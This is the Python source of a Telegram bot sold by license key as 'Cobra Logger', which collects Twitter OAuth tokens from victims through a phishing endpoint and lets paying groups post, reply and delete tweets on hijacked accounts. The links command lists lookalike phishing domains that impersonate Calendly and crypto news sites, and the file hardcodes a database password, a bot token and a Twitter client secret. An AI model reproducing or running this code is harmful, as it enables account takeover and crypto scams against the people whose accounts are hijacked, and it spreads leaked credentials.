import random
import string
import requests
import urllib.parse
import base64
import validators
import uuid
from datetime import datetime, timedelta
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from keep_alive import keep_alive
keep_alive()

MONGO_URI = "mongodb+srv://advonisx:TRYsyrGie4c0uVEw@cluster0.qtpxk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&ssl=true"
TELEGRAM_BOT_TOKEN = '6790216831:AAHbUIZKq38teKnZIw9zUQDRSD6csT-JEs4'
TWITTER_CLIENT_ID = 'eWNUdkx4LTnaGQ0N3BaSGJyYkU6MTpjaQ'
TWITTER_CLIENT_SECRET = '4cct_4dZ3BVz_MNKKjazWi1M3XVelnSiGqV6R5hBxC-Pbj7ytn'

client = MongoClient(MONGO_URI, server_api=ServerApi('1'))
db = client['cobra_db']
users = db['users']
groups = db['groups']
licenses = db['licenses']

parse_mode = "MarkDown"

try:
    client.admin.command('ping')
    print("[+] MongoDB has successfully connected.")
except Exception as e:
    print("[-] MongoDB has failed connecting.")
    print(e)

def generate_random_key(length=12, segment_length=4):
    characters = string.ascii_uppercase + string.digits  # Use uppercase letters and digits
    key = ''.join(random.choice(characters) for _ in range(length))
    
    segments = [key[i:i+segment_length] for i in range(0, len(key), segment_length)]
    
    return '-'.join(segments)
    
async def check_license(user_id, chat_id, context):
    group = groups.find_one({"group_id": chat_id})
    
    if group:
        text = "⚠️ *License not found or has expired. Please purchase a license to continue using Cobra Logger.*"
        
        license = licenses.find_one({"used_by": group.get("owner_id"), "status": "active"})
        if not license:
            await context.bot.send_message(chat_id, text, parse_mode) 
            return False
        
        expiration_date = license.get("expiration_date")
        if expiration_date and datetime.utcnow() > expiration_date:
            await context.bot.send_message(chat_id, text, parse_mode) 
            return False
            
        return True
    else:
        text = "⚠️ *Group is not setup for OAuth.*\n\n💬 _Use the /setup command to setup your group for OAuth._"
        await context.bot.send_message(chat_id, text, parse_mode) 
        return False


async def start(update: Update, context: CallbackContext) -> None:
    chat_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
    
    if context.args == None:
        return
        
    key = context.args[0]
    
    license = licenses.find_one({"key": key, "used_by": None})
    if not license:
        text="❌ *The license key you provided is invalid.*"
        
        await context.bot.send_message(chat_id, text, parse_mode)
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if licenses.find_one({"used_by": user_id}):
        text="⚠️ *A license is already active on your account.*"
        
        await context.bot.send_message(chat_id, text, parse_mode)
        return
        
    user_data = {
        "user_id": user_id,
        "username": username,
        "group_id": None
    }
    users.insert_one(user_data)
    
    license_data = {
        "used_by": user_id,
    }
    result = licenses.update_one(
        {"key": key},
        {"$set": license_data}
    )
    
    if result.modified_count > 0:
        expiration_date = license.get("expiration_date")
        expiration_msg = expiration_date.strftime('%Y-%m-%d') if expiration_date else "Never"
        
        text = f"🐍 *Welcome to Cobra Logger, {update.effective_user.full_name}*! 🐍\n\n✅ *Your license has been activated and will expire:* `{expiration_msg}`\n\n💬 _To get started, add me to a group and use the /setup command to setup your group for OAuth._"
        await context.bot.send_message(chat_id, text, parse_mode)
    else:
        text = "⚠️ *An unknown error has occured.*"
        await context.bot.send_message(chat_id, text, parse_mode)


async def help(update: Update, context: CallbackContext) -> None:
    chat_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
        
    text = "❔ *List of Commands*\n\n *•* 🐦 */post_tweet* <username> <message> - Posts a tweet on behalf of the user.\n *•* 💬 */post_reply* <username> <tweetId> <message> - Posts a reply to a tweet on behalf of the user.\n *•* ❌ */delete_tweet* <username> <tweetId> - Deletes a tweet on behalf of the user.\n *•* 👥 */display_users* - Shows the list of authenticated users.\n *•* 🔗 */display_endpoint* - Displays the group's endpoint.\n *•* 🔄 */set_redirect* - Sets the redirect upon authorization.\n *•* ❔ */help* - Displays the list of commands."
    await context.bot.send_message(chat_id, text, parse_mode)


async def setup(update: Update, context: CallbackContext) -> None:
    chat_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
        
    group = groups.find_one({"group_id": chat_id})
    if group:
        text = "⚠️ *This group is already setup for OAuth.*"
        await context.bot.send_message(chat_id, text, parse_mode)
        return
            
    owner_id = update.message.from_user.id
    owner_username = update.message.from_user.username
    group_name = update.message.chat.title
    identifier = str(uuid.uuid4())
    
    license = licenses.find_one({"used_by": owner_id, "status": "active"})
    if not license:
        text = "⚠️ *License not found or has expired. Please purchase a license to continue using Cobra Logger.*"
        await context.bot.send_message(chat_id, text, parse_mode)
        return
        
    expiration_date = license.get("expiration_date")
    if expiration_date and datetime.utcnow() > expiration_date:
        text = "⚠️ *License not found or has expired. Please purchase a license to continue using Cobra Logger.*"
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
    
    if license:
        group_data = {
            "group_id": chat_id,
            "group_name": group_name,
            "owner_id": owner_id,
            "owner_username": owner_username,
            "identifier": identifier,
            "redirect": "https://calendly.com/cointele",
            "endpoint": f"https://cobratool.dev/oauth?identifier={identifier}",
            "authenticated_users": []
        }
        groups.insert_one(group_data)
        
        user_data = {
            "group_id": chat_id
        }
        result = users.update_one(
            {"user_id": owner_id},
            {"$set": user_data}
        )
        
        if result.modified_count > 0:
            text = f"✅ *Group successfully setup for OAuth.*\n\n╭  ℹ️ *GROUP INFO*\n┣  *Group ID:* {group_data['group_id']}\n┣  *Group Name:* {group_data['group_name']}\n┣  *Owner: @{group_data['owner_username']}*\n╰  *Identifier:* {group_data['identifier']}"
            await context.bot.send_message(chat_id, text, parse_mode)
        else:
            text = "⚠️ *An unknown error has occured.*"
            await context.bot.send_message(chat_id, text, parse_mode)


async def set_redirect(update: Update, context: CallbackContext) -> None:
    chat_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
    
    license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
    if not license:
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            'Usage: /set_redirect <url>')
        return
        
    url = args[0]
    
    if not validators.url(url):
        text = "⚠️ *The URL you provided is invalid.*"
        await context.bot.send_message(chat_id, text, parse_mode)
    else:
        group_data = {
            "redirect": url
        }
        groups.update_one(
            {"group_id": chat_id},
            {"$set": group_data}
        )
        
        text = f"✅ *Redirect URL for this group successfully set to {url}.*"
        await context.bot.send_message(chat_id, text, parse_mode)

async def tweet(update: Update, context: CallbackContext) -> None:
    license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
    if not license:
        return
        
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            'Usage: /post_tweet <username> <message>')
        return

    access_token = args[0]
    tweet_text = ' '.join(arg.strip()
                          for arg in args[1:]).replace('\\\\n', '\n')

    group_name = update.message.chat.title
    print(f"({group_name}) tweeted: {tweet_text} [{access_token}]\n")

    tweet_url = 'https://api.twitter.com/2/tweets'
    user_lookup_url = 'https://api.twitter.com/2/users/me'
    upload_media_url = 'https://upload.twitter.com/1.1/media/upload.json?media_category=tweet_image'

    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    response = requests.get(user_lookup_url, headers=headers)
    response_data = response.json()

    username = response_data['data']['username']

    tweet_data = {'text': tweet_text, 'reply_settings': "mentionedUsers"}
    response = requests.post(tweet_url, json=tweet_data, headers=headers)
    response_data = response.json()

    tweetId = response_data['data']['id']
    chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id

    if response.status_code == 201:
        await context.bot.send_message(
            chat_id=chatId,
            text=
            f'✅ *Tweet Posted* ✅\n\nx.com/{username}/status/{tweetId}\n\n🔑 Access Token:\n`{access_token}`',
            parse_mode=parse_mode)
    else:
        await context.bot.send_message(
            chat_id=chatId,
            text=f'🚫 Tweet Failed 🚫\nError: {response_data["title"]}')


async def reply(update: Update, context: CallbackContext) -> None:
    license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
    if not license:
        return
        
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            'Usage: /post_reply {accessToken} {tweetId} {text}')
        return

    access_token = args[0]
    tweet_id = args[1]
    tweet_text = ' '.join(arg.strip()
                          for arg in args[2:]).replace('\\\\n', '\n')

    tweet_url = 'https://api.twitter.com/2/tweets'
    user_lookup_url = 'https://api.twitter.com/2/users/me'

    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    response = requests.get(user_lookup_url, headers=headers)
    response_data = response.json()

    username = response_data['data']['username']

    tweet_data = {
        'text': tweet_text,
        'reply': {
            'in_reply_to_tweet_id': tweet_id,
        }
    }
    response = requests.post(tweet_url, json=tweet_data, headers=headers)
    response_data = response.json()

    tweetId = response_data['data']['id']
    chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id

    if response.status_code == 201:
        await context.bot.send_message(
            chat_id=chatId,
            text=
            f'✅ *Reply Posted* ✅\n\nx.com/{username}/status/{tweetId}\n\n🔑 Access Token:\n`{access_token}`',
            parse_mode=parse_mode)
    else:
        await context.bot.send_message(
            chat_id=chatId,
            text=f'🚫 Tweet Failed 🚫\nError: {response_data["title"]}')


async def refresh(update: Update, context: CallbackContext) -> None:
    args = context.args
    if len(args) < 1:
        await update.message.reply_text('Usage: /refresh {refreshToken}')
        return

    refresh_token = args[0]
    token_refresh_URL = 'https://api.twitter.com/2/oauth2/token'
    headers = {
        'Authorization':
        'Basic ' + base64.b64encode(
            f'{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}'.encode()).decode(),
        'Content-Type':
        'application/x-www-form-urlencoded'
    }
    request_data = {
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token
    }

    try:
        response = requests.post(token_refresh_URL,
                                 data=urllib.parse.urlencode(request_data),
                                 headers=headers)
        response_data = response.json()
        

        new_access_token = response_data['access_token']
        new_refresh_token = response_data['refresh_token']

        user_lookup_url = 'https://api.twitter.com/2/users/me'

        headers = {
            'Authorization': f'Bearer {new_access_token}',
            'Content-Type': 'application/json'
        }

        response = requests.get(user_lookup_url, headers=headers)
        response_data2 = response.json()
        

        username = response_data2['data']['username']

        chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id
        print(f"({update.message.chat.title}) refreshed: (Access Token: {new_access_token}) (Refresh Token: {new_refresh_token}) [@{username if username else 'error'}]\n")

        if response.status_code == 200:
            await context.bot.send_message(
                chat_id=chatId,
                text=
                f'🔄 *Token Refreshed* 🔄\n\n👤 Account:\nx.com/{username}\n\n🔑 Access Token:\n`{new_access_token}`\n\n🔄 Refresh Token:\n`{new_refresh_token}`',
                parse_mode=parse_mode)
        else:
            await update.message.reply_text(
                f'🚫 *Refresh Failed* 🚫\nError: {response_data["error_description"]}',
                parse_mode=parse_mode)
    except Exception as e:
        await update.message.reply_text(
            f'🚫 *Refresh Failed* 🚫\nError: {str(e)}')


async def delete(update: Update, context: CallbackContext) -> None:
    license = await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context)
    if not license:
        return
        
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            'Usage: /delete_tweet {accessToken} {id}')
        return

    access_token = args[0]
    tweetId = args[1]

    delete_url = f'https://api.twitter.com/2/tweets/{tweetId}'
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }
    response = requests.delete(delete_url, headers=headers)
    response_data = response.json()

    chatId = update.message.chat_id if update.message else update.callback_query.message.chat_id

    if response.status_code == 200:
        await context.bot.send_message(chat_id=chatId,
                                       text='❌ Tweet Deleted ❌')
    else:
        print(response_data)
        await update.message.reply_text(
            f'🚫 Deletion Failed 🚫\nError: {response_data["title"]}')

async def links(update: Update, context: CallbackContext) -> None:
    group_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
    links = []
    ls = []
    if group_id == -4146400715:
        ls = ['https://www\.calendlly\.xyz/coingecko/invitation', 'https://www\.calendlly\.xyz/coinmarketcap/invitation', 'https://www\.calendlly\.xyz/bitcoinmagazine/invitation']
    elif group_id == -4148855237:
        ls = ['https://www\.cointele\.site/cointelegraph/meeting\-hour?month\=2024\-07']
    elif group_id == -4537180005:
        ls = ['https://callendly\.pythonanywhere\.com/cointelegraph']

    print(f"({update.message.chat.title}) retrieved links: [{'] ['.join(ls) if ls else 'None :('}]")
    for link in ls:
        link = f'> 🔗 {link}'
        links.append(link)
    nl = '\n'
    list = nl.join(links)
    await context.bot.send_message(chat_id=group_id, text=f"🔗 *Links* 🔗\n\n{list if links else '> Nothing to see here 👀'}", parse_mode='MarkdownV2')

async def id(update: Update, context: CallbackContext) -> None:
    group_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
    await context.bot.send_message(chat_id=group_id, text=f"🆔 *Group ID* 🆔\n\n`{group_id}`")
    
    
async def generate_key(update: Update, context: CallbackContext) -> None:
    chat_id = update.message.chat_id if update.message else update.callback_query.message.chat_id
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /generate_key <expiration>, e.g., /generate_key 1d, 7d, 1m, 1y, lifetime")
        return

    expiration = context.args[0]
    key = generate_random_key()  # Use the function to generate a key with dashes
    expiration_date = None

    if expiration == '7d':
        expiration_date = datetime.now() + timedelta(days=7)
    elif expiration == '1m':
        expiration_date = datetime.now() + timedelta(days=30)
    elif expiration == 'lifetime':
        expiration_date = None  # No expiration
    else:
        await update.message.reply_text("Invalid expiration format. Use 1d, 7d, 1m, 1y, or lifetime.")
        return

    # Insert the key and expiration date into the MongoDB collection
    license_data = {
        "key": key,
        "used_by": None,
        "status": "active",
        "expiration_date": expiration_date
    }
    licenses.insert_one(license_data)

    expiration_msg = expiration_date.strftime('%Y-%m-%d') if expiration_date else "Lifetime"
    await context.bot.send_message(chat_id=chat_id, text=f"☑️ *License Generated*\n\n🔗 *Link*\n*https://t.me/uaODw8xjIam_bot?start={key}*\n📅 *Expiration*\n`{expiration_msg}`", parse_mode=parse_mode)
    

def main() -> None:
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help))
    app.add_handler(CommandHandler("post_tweet", tweet))
    app.add_handler(CommandHandler("post_reply", reply))
    app.add_handler(CommandHandler("setup", setup))
    app.add_handler(CommandHandler("refresh", refresh))
    app.add_handler(CommandHandler("delete_tweet", delete))
    app.add_handler(CommandHandler("generate_key", generate_key))
    app.add_handler(CommandHandler("set_redirect", set_redirect))
    app.add_handler(CommandHandler("links", links))
    app.add_handler(CommandHandler("id", id))
    app.run_polling(poll_interval=5)


if __name__ == '__main__':
    main()
